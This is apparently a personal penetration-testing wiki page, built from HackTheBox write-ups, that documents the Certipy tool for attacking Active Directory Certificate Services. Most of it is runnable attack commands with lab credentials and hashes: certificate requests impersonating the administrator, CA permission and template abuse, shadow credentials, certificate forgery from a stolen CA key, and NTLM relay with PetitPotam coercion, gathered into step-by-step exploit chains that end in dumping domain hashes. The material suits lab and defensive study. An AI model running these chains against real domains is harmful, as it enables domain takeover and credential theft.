---
title: "Certipy"
type: tool
tags: [active-directory, adcs, certificates, esc1, esc13, esc16, esc4, esc7, esc8, esc9, kerberos, shadow-credentials, windows]
date_created: 2026-05-12
date_updated: 2026-05-12
sources: [0xdf-tools-certipy]
phase: aux
---

## Purpose

**Certipy** is a Python tool for enumerating and exploiting Active Directory Certificate Services (ADCS) misconfigurations, supporting template discovery, certificate requests, Kerberos PKINIT authentication, shadow credential attacks, certificate forgery, and NTLM relay to ADCS HTTP endpoints.

## Install / setup

```bash
pip install certipy-ad
# or
pipx install certipy-ad
# or
uv tool install certipy-ad
```

The binary is `certipy`. Keep it updated: ESC detection signatures are added regularly (e.g., ESC16 was added fewer than two weeks before the Fluffy HTB machine released).

```bash
uv tool upgrade certipy-ad
```

GitHub: https://github.com/ly4k/Certipy

## Core usage

```
certipy <subcommand> [options]
```

**Subcommands:** `find`, `req`, `auth`, `shadow`, `forge`, `relay`, `ca`, `cert`, `template`, `account`

### Authentication flags (used across most subcommands)

| Flag | Description |
|---|---|
| `-u` / `-username` | Username (use `user@domain` format) |
| `-p` / `-password` | Password |
| `-hashes :NThash` | NT hash authentication |
| `-k` | Kerberos authentication (requires `KRB5CCNAME` to be set) |
| `-no-pass` | No password prompt (for Kerberos auth) |
| `-dc-ip` | IP address of the domain controller |
| `-target` | Hostname or FQDN of the target (CA server or DC) |
| `-ns` | DNS nameserver to use for resolution |

## Subcommand reference

### `certipy find`: discover ADCS templates and CAs

```bash
# Find all templates and CAs, show only vulnerable ones
certipy find -vulnerable -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -stdout

# Find all templates (no -vulnerable filter) — useful for manual review
certipy find -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ns 10.10.11.236 -stdout

# With Kerberos auth
certipy find -vulnerable -k -no-pass -target DC01.mirage.htb -dc-ip 10.10.11.78 -stdout

# With NT hash
certipy find -vulnerable -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51 -stdout
```

Output shows CA configuration (web enrollment state, permissions, ManageCa/ManageCertificates rights) and a `[!] Vulnerabilities` block per template listing the ESC class and the reason.

### `certipy req`: request a certificate

```bash
# ESC1: enroll as user, specify a different UPN (impersonate admin)
certipy req -u ryan.cooper -p NuclearMosquito3 \
  -target sequel.htb -ca sequel-dc-ca \
  -template UserAuthentication -upn administrator@sequel.htb

# ESC1 with key-size override (some templates require >= 4096)
certipy req -u 'BANKING$@retro.vl' -p 0xdf0xdf \
  -ca retro-DC-CA -template RetroClients \
  -upn administrator@retro.vl -key-size 4096

# ESC1 with explicit SID (required when object SID is missing from cert)
certipy req -u clifford.davey -p RFmoB2WplgE_3p \
  -dc-ip 10.129.234.66 -ca sendai-DC-CA \
  -template SendaiComputer -target DC.sendai.vl \
  -upn administrator@sendai.vl -sid S-1-5-21-3085872742-570972823-736764132-500

# Retrieve a previously issued (but denied) certificate by request ID
certipy req -ca manager-DC01-CA -target dc01.manager.htb \
  -retrieve 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'

# Request with Kerberos ticket
certipy req -k -no-pass -u svc_cabackup \
  -ca mist-DC01-CA -template BackupSvcAuthentication \
  -dc-ip 192.168.100.100 -dns 192.168.100.100 \
  -key-size 4096 -target DC01.mist.htb

# ESC3: request on behalf of another user (requires enrollment agent cert)
certipy req -u Lion.SK -p '!QAZ2wsx' \
  -target certificate.htb -ca 'Certificate-LTD-CA' \
  -template SignedUser -on-behalf-of 'CERTIFICATE\administrator' -pfx lion.sk.pfx
```

On success, the certificate and private key are saved to `<username>.pfx`.

### `certipy auth`: authenticate with a certificate

```bash
# Get NT hash + TGT from a .pfx certificate
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236

# Specify domain and username explicitly (needed when cert lacks UPN)
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.65 \
  -domain scepter.htb -username h.brown

# Get a Kerberos ticket in kirbi format (for use with other tools)
certipy auth -pfx ./svc_cabackup.pfx -kirbi -dc-ip 192.168.100.100

# Open an LDAP shell via SChannel (fallback when PKINIT fails)
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell
```

On success, outputs the NT hash (`Got hash for '<user>@<domain>': aad3b435b51404eeaad3b435b51404ee:<nthash>`) and saves a `.ccache` file.

### `certipy shadow`: shadow credential attacks

**Shadow credentials** work by adding a `msDS-KeyCredentialLink` value to a user object. You need `GenericWrite` or `GenericAll` over the target account. The `auto` subcommand adds the credential, authenticates to get the NT hash, and then removes it.

```bash
# Add shadow credential to management_svc and retrieve NT hash
certipy shadow auto \
  -username judith.mader@certified.htb -password judith09 \
  -account management_svc -target certified.htb -dc-ip 10.10.11.41

# With NT hash for the attacker account
certipy shadow auto \
  -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 \
  -account ca_operator -target certified.htb -dc-ip 10.10.11.41

# With Kerberos ticket
KRB5CCNAME=Haze-IT-Backup\$.ccache certipy shadow auto \
  -username 'Haze-IT-Backup$' -account edward.martin \
  -k -target dc01.haze.htb

# Via proxychains
sudo proxychains -q certipy shadow auto \
  -username 'svc_ca$@mist.htb' -hashes :07bb1cde74ed154fcec836bc1122bdcc \
  -account svc_cabackup
```

### `certipy forge`: forge a certificate from stolen CA key

Requires the CA certificate and private key (exported as a `.pfx` from the CA server).

```bash
# Forge a certificate as Administrator
certipy forge \
  -ca-pfx ca.pfx \
  -upn Administrator@certificate.htb \
  -subject 'CN=ADMINISTRATOR,CN=USERS,DC=CERTIFICATE,DC=HTB'
```

Saves the result to `administrator_forged.pfx`. Then authenticate with `certipy auth`.

### `certipy relay`: NTLM relay to ADCS HTTP enrollment (ESC8)

**ESC8** exploits ADCS web enrollment (HTTP) accepting NTLM authentication. An attacker relays coerced authentication from a DC machine account to the HTTP endpoint.

```bash
# Start the relay listener targeting the ADCS web endpoint
certipy relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController
```

The relay listens on `0.0.0.0:445`. When the coerced auth arrives, it is relayed to the ADCS endpoint and the resulting certificate is saved to `<hostname>.pfx`.

After obtaining the machine account certificate, authenticate with `certipy auth` to get the NT hash for the machine account, then run `secretsdump.py` for domain hashes.

### `certipy ca`: manage CA permissions (ESC7)

**ESC7** abuses when a user has `ManageCa` rights. The attack adds `ManageCertificates` rights to the attacker user, then manually issues a denied certificate request.

```bash
# Add officer (ManageCertificates) rights using ManageCa rights
certipy ca -ca manager-DC01-CA -add-officer raven \
  -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'

# Issue a pending/denied certificate request by ID
certipy ca -ca manager-DC01-CA -issue-request 13 \
  -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

### `certipy template`: modify template configuration (ESC4)

When a user has `WriteProperty` over a template, the template can be modified to be vulnerable to ESC1.

```bash
# Overwrite template with default vulnerable configuration
certipy template -u clifford.davey -p RFmoB2WplgE_3p \
  -dc-ip 10.129.234.66 -template SendaiComputer \
  -write-default-configuration -no-save

# Restore original configuration
certipy template -u ca_svc@sequel.htb \
  -hashes 3b181b914e7a9d5508ea1e20bc2b7fce \
  -template DunderMifflinAuthentication \
  -write-default-configuration -no-save
```

### `certipy account`: modify user UPN (ESC9/ESC16)

**ESC9/ESC16** exploit weak certificate mapping. If a user with `GenericWrite` can modify another user's `userPrincipalName`, that user can request a certificate that maps to a different account.

```bash
# Read current UPN
certipy account -u winrm_svc@fluffy.htb \
  -hashes 33bd09dcd697600edf6b3a7af4875767 \
  -user ca_svc read

# Set UPN to Administrator (before requesting cert)
certipy account -u winrm_svc@fluffy.htb \
  -hashes 33bd09dcd697600edf6b3a7af4875767 \
  -user ca_svc -upn administrator update

# Restore original UPN (after cert is obtained)
certipy account -u winrm_svc@fluffy.htb \
  -hashes 33bd09dcd697600edf6b3a7af4875767 \
  -user ca_svc -upn ca_svc@fluffy.htb update
```

### `certipy cert`: split a .pfx into key and certificate files

```bash
# Extract only the private key
certipy cert -pfx administrator_authority.pfx -nocert -out administrator.key

# Extract only the certificate
certipy cert -pfx administrator_authority.pfx -nokey -out administrator.crt

# Export a .pfx with a known password
certipy cert -export -pfx KJNQDFsA.pfx -password rJptn57fg3n4kIRj7Xnc -out clean.pfx
```

Splitting is needed for PassTheCert attacks when `certipy auth` fails with `KDC_ERR_PADATA_TYPE_NOSUPP`.

## Common use cases

### Full ESC1 exploit chain

1. Enumerate vulnerable templates with `certipy find -vulnerable`.
2. Request a certificate with `-upn administrator@domain` using an enrollable template.
3. Sync clock: `sudo ntpdate <DC_IP>`.
4. Authenticate: `certipy auth -pfx administrator.pfx -dc-ip <DC_IP>`.
5. Use the returned NT hash with `evil-winrm` or `secretsdump.py`.

```bash
certipy find -vulnerable -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -stdout
certipy req -u ryan.cooper -p NuclearMosquito3 -target sequel.htb \
  -ca sequel-dc-ca -template UserAuthentication -upn administrator@sequel.htb
sudo ntpdate sequel.htb
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.202
```

### Full ESC8 relay chain

```bash
# 1. Check coercion methods
netexec smb DC.cicada.vl -u rosie -p Cicada123 -k -M coerce_plus

# 2. Start the relay
certipy relay -target 'http://dc.cicada.vl/' -template DomainController

# 3. Trigger coercion (in another terminal)
netexec smb DC.cicada.vl -u rosie -p Cicada123 -k \
  -M coerce_plus -o LISTENER=<malicious_dns_record> METHOD=PetitPotam

# 4. Authenticate with the resulting machine account cert
certipy auth -pfx dc.pfx -dc-ip 10.129.234.48
```

### Shadow credential chain

```bash
# 1. GenericWrite over target user
certipy shadow auto -username attacker@domain.htb -password pass \
  -account target_user -target dc.domain.htb -dc-ip <DC_IP>

# 2. Use returned NT hash
netexec smb dc.domain.htb -u target_user -H :<nthash>
```

### ESC7 chain (ManageCa privilege)

```bash
# 1. Add ManageCertificates permission to self
certipy ca -ca CA-NAME -add-officer raven \
  -username raven@domain.htb -p 'Password'

# 2. Submit a SubCA request (will be denied, but saves private key)
certipy req -ca CA-NAME -target dc.domain.htb \
  -template SubCA -upn administrator@domain.htb \
  -username raven@domain.htb -p 'Password'
# note the request ID

# 3. Issue the denied request
certipy ca -ca CA-NAME -issue-request <ID> \
  -username raven@domain.htb -p 'Password'

# 4. Retrieve the certificate
certipy req -ca CA-NAME -target dc.domain.htb \
  -retrieve <ID> -username raven@domain.htb -p 'Password'

# 5. Authenticate
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

## Tips and gotchas

**Clock skew kills `certipy auth`:** PKINIT authentication requires clocks within 5 minutes. The error is `KRB_AP_ERR_SKEW(Clock skew too great)`. Fix with `sudo ntpdate <DC_IP>` or `sudo ntpdate -u <hostname>`. This may drop your VPN; reconnect and re-run `certipy auth`.

**`KDC_ERR_PADATA_TYPE_NOSUPP`:** The DC does not have a certificate installed for smart card (PKINIT) authentication. `certipy auth` will fail. Fall back to a PassTheCert attack: split the `.pfx` with `certipy cert`, then use `passthecert.py -action ldap-shell` to get LDAP access. Alternatively use `certipy auth -ldap-shell` directly.

**CA name format:** The `-ca` flag requires the CA name exactly as returned by `certipy find` (e.g., `sequel-DC-CA`, not just `DC-CA`). Copy it verbatim from the `CA Name` field in `find` output.

**`--dc-ip` vs `-target`:** `-dc-ip` specifies the IP of the domain controller for Kerberos/LDAP. `-target` specifies the FQDN of the host to contact for certificate enrollment (the CA server, which is often the DC but can differ). Use both when the environment requires explicit IP-to-hostname mapping.

**`-ns` for DNS resolution:** In environments where your attacker machine's DNS does not resolve domain hostnames, pass `-ns <DC_IP>` to tell `certipy` which DNS server to use.

**Missing object SID warning:** `[*] Certificate has no object SID` means the cert was issued without a SID binding. On patched DCs (KB5014754, post-May 2022 strong certificate mapping), `certipy auth` may fail because the KDC requires an explicit SID. Add `-sid <user_SID>` to the `req` command to embed the correct SID.

**`-key-size 4096`:** Some templates enforce a minimum RSA key size (e.g., 4096 bits). If `certipy req` returns a public key length error, add `-key-size 4096`.

**Proxychains:** When the target is behind a pivot, prefix all `certipy` commands with `proxychains` or `proxychains -q`. Kerberos-based commands also need `KRB5CCNAME` set before `proxychains`.

**Version matters for newer ESCs:** ESC9 (v4.0+), ESC13 and ESC16 (v4.8+, late 2024) are only detected by recent versions. If `certipy find` shows no vulnerabilities but ADCS is present, upgrade certipy and re-run.

**LDAP channel binding errors:** Some DCs require LDAPS. Add `-scheme ldaps -ldap-channel-binding` to `certipy find` if you get channel binding errors over standard LDAP.

**`certipy shadow auto` cleanup:** The `auto` subcommand automatically removes the key credential after retrieving the hash. If the attack is interrupted mid-way, the target account may have a dangling key credential. Use `certipy shadow clear` to remove it manually.

## Related techniques

- [[uac-bypass]] (ESC1 via CVE-2022-26923 is documented there)
- [[ad-lateral-movement]]
- [[pass-the-hash]]
- [[ad-enumeration]]

## Sources

- 0xdf HTB writeups: absolute, authority, certificate, certified, darkcorp, darkzero, escape, escapetwo, fluffy, haze, manager, mirage, mist, rebound, retro, scepter, sendai, tombwatcher, vulncicada
